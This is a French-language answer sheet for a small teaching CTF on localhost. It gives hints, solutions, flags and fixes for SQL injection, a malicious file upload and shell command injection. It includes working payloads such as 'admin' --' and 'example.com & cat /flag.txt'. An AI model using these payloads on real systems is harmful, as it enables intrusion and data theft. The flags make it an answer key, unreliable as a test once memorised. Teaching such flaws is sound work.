# Mini CTF - Énoncés, indices et solutions

Lancement : `cd ctf && docker compose up -d --build`
Challenges : http://localhost:8081 (SQLi), :8082 (Upload), :8083 (Commande shell)
Format des flags : `CTF{...}`

> ⚠️ Environnement pédagogique isolé. Ne jamais exposer ces conteneurs sur Internet.

---

## Challenge 1 - Injection SQL (100 pts)
**Énoncé** : « L'intranet d'ACME protège un secret derrière le compte `admin`. Récupérez-le sans connaître le mot de passe. »

**Indices**
1. Que se passe-t-il si vous saisissez une apostrophe `'` dans le login ?
2. La requête est construite par concaténation de chaînes.

**Solution**
- Login : `admin' --` , mot de passe : n'importe quoi.
- La requête devient `... WHERE username='admin' --' AND password='...'` : la partie mot de passe est mise en commentaire.
- Alternative : `' OR 1=1 --` renvoie le premier utilisateur (guest), donc utiliser `admin' --` pour obtenir le secret.
- Flag : `CTF{sql_1njection_b4sics}`

**Correction** : requêtes paramétrées (`conn.execute("... WHERE username=? AND password=?", (u, p))`), mots de passe hachés (bcrypt/argon2).

---

## Challenge 2 - Upload de fichier malveillant (200 pts)
**Énoncé** : « La galerie photo accepte "uniquement des images". Lisez le fichier `/app/flag.txt` sur le serveur. »

**Indices**
1. Le serveur ne vérifie ni l'extension ni le contenu.
2. Les fichiers `.py` déposés sont exécutés quand on les consulte via `/files/<nom>`.

**Solution**
1. Créer `shell.py` :
   ```python
   print(open("/app/flag.txt").read())
   ```
2. L'envoyer via le formulaire.
3. Ouvrir `http://localhost:8082/files/shell.py`.
- Flag : `CTF{unr3stricted_upl0ad_rce}`

**Correction** : liste blanche d'extensions, vérification du type MIME réel (magic bytes), renommage aléatoire, stockage hors du dossier exécutable, `secure_filename`, aucune exécution des fichiers uploadés.

---

## Challenge 3 - Exécution de commande shell (200 pts)
**Énoncé** : « L'outil DNS interne filtre `;`, `|` et `&&`. Lisez `/flag.txt`. »

**Indices**
1. Le filtre est incomplet : d'autres séparateurs de commandes existent.
2. Essayez le retour à la ligne (`%0a`), `&` ou la substitution `$(...)`.

**Solution**
- Saisir : `example.com & cat /flag.txt` (ou `$(cat /flag.txt)`).
- Le shell exécute `nslookup example.com & cat /flag.txt` ; le flag apparaît dans la sortie.
- Flag : `CTF{c0mmand_1njection_pwn3d}`

**Correction** : ne jamais utiliser le shell (`subprocess.run(["nslookup", host], shell=False)`), valider l'entrée par liste blanche (regex de nom d'hôte).

---

## Configuration dans CTFd
Pour chaque challenge : Admin Panel > Challenges > Create > type `standard`, catégorie `Web`, valeur de points, flag de type `static` (texte ci-dessus), et ajout des hints. Voir GUIDE.md, section 6.
